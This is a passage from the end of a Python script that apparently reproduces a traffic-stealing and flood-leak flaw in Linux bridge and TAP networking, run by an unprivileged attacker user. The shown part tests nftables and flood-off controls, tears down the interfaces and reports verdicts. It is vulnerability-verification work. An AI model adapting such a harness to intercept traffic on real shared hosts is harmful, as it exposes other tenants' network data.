        regress = deliver(bridge_sock, "regressFloodC", GUEST_C_MAC, GUEST_C_IP)
        emit("STEP8", f"flood_leak_without_nft_again={regress['A_child_hits'] > 0} A_child_hits={regress['A_child_hits']}")
        run(["bridge", "link", "set", "dev", tap_a, "flood", "off"])
        run(["bridge", "link", "set", "dev", tap_b, "flood", "off"])
        emit("STEP8", f"bridge_link_a={cmd_out(['bridge', '-details', 'link', 'show', 'dev', tap_a])}")
        floodoff = deliver(bridge_sock, "floodOffC", GUEST_C_MAC, GUEST_C_IP)
        bcast2 = deliver(bridge_sock, "floodOffBcast", b"\xff" * 6, GUEST_B_IP)
        flood_blocked_off = floodoff["A_child_hits"] == 0 and floodoff["A_cap_hits"] == 0
        bcast2_ok = bcast2["A_child_hits"] > 0 or bcast2["A_cap"] > 0
        results["control_floodoff_blocks_flood"] = flood_blocked_off
        results["control_floodoff_allows_broadcast"] = bcast2_ok
        emit("STEP8", f"RESULT flood_off_blocks_flood={flood_blocked_off} broadcast_still_delivered={bcast2_ok}")

        verdicts["CONTROL_BLOCKS"] = steal_blocked and flood_blocked_nft and flood_blocked_off

        # ---------------- STEP 9: TEARDOWN ----------------
        emit("STEP9", "hypothesis=every resource removes to an exact empty complement")
        child("EXIT")
        os.waitpid(child_pid, 0)
        child_pid = None
        os.close(victim_b_fd)
        victim_b_fd = None
        cap_a.close(); cap_a = None
        cap_b.close(); cap_b = None
        bridge_sock.close()
        for name in (tap_a, tap_b):
            run(["ip", "link", "delete", "dev", name], check_rc=False)
        run(["ip", "link", "delete", "dev", bridge], check_rc=False)
        residue = {
            "tap_a_exists": iface_exists(tap_a), "tap_b_exists": iface_exists(tap_b),
            "bridge_exists": iface_exists(bridge),
            "nft_exists": run(["nft", "list", "table", "bridge", nft], check_rc=False).returncode == 0,
            "tap_a_holders": tun_holders(tap_a), "tap_b_holders": tun_holders(tap_b),
        }
        emit("STEP9", f"final_residue={json.dumps(residue, sort_keys=True)}")
        results["teardown_clean"] = not any(bool(v) for v in residue.values())
        emit("STEP9", f"RESULT teardown_clean={results['teardown_clean']}")

        # ---------------- SUMMARY ----------------
        emit("SUMMARY", f"attacker_uid_4200_no_CAP_NET_ADMIN={results.get('attacker_uid_4200_no_caps')}")
        for key, value in results.items():
            emit("SUMMARY", f"{key}={value}")
        emit("SUMMARY", f"VERDICT_STEAL_REPRODUCED={verdicts.get('STEAL_REPRODUCED')}")
        emit("SUMMARY", f"VERDICT_CONTROL_BLOCKS={verdicts.get('CONTROL_BLOCKS')}")
        print(f"VERDICT STEAL_REPRODUCED={verdicts.get('STEAL_REPRODUCED')} "
              f"CONTROL_BLOCKS={verdicts.get('CONTROL_BLOCKS')}", flush=True)
        return 0
    except BaseException as error:  # noqa: BLE001
        emit("FAILURE", f"error={type(error).__name__}: {error}")
        for key, value in results.items():
            emit("SUMMARY", f"{key}={value}")
        print("VERDICT INCOMPLETE", flush=True)
        raise
    finally:
        residue = []
        if child_pid is not None:
            try:
                os.write(p2c_w, b"EXIT\n")
            except OSError:
                pass
            try:
                os.waitpid(child_pid, os.WNOHANG)
            except OSError:
                pass
            try:
                os.kill(child_pid, 9)
                os.waitpid(child_pid, 0)
            except OSError:
                pass
            residue.append(f"child_pid={child_pid}")
        for closer in (victim_b_fd,):
            if closer is not None:
                try:
                    os.close(closer)
                except OSError:
                    pass
        for sock in (cap_a, cap_b):
            if sock is not None:
                try:
                    sock.close()
                except OSError:
                    pass
        if run(["nft", "list", "table", "bridge", nft], check_rc=False).returncode == 0:
            residue.append(f"nft={nft}")
            run(["nft", "delete", "table", "bridge", nft], check_rc=False)
        for name in (tap_a, tap_b, bridge):
            if iface_exists(name):
                residue.append(f"link={name}")
                run(["ip", "link", "delete", "dev", name], check_rc=False)
        final = {
            "tap_a_exists": iface_exists(tap_a), "tap_b_exists": iface_exists(tap_b),
            "bridge_exists": iface_exists(bridge),
            "nft_exists": run(["nft", "list", "table", "bridge", nft], check_rc=False).returncode == 0,
        }
        print(f"CLEANUP residue_found_by_fallback={residue}", flush=True)
        print("CLEANUP " + json.dumps(final, sort_keys=True), flush=True)
        print(f"cleanup_complete={not any(bool(v) for v in final.values())}", flush=True)


if __name__ == "__main__":
    sys.exit(main())
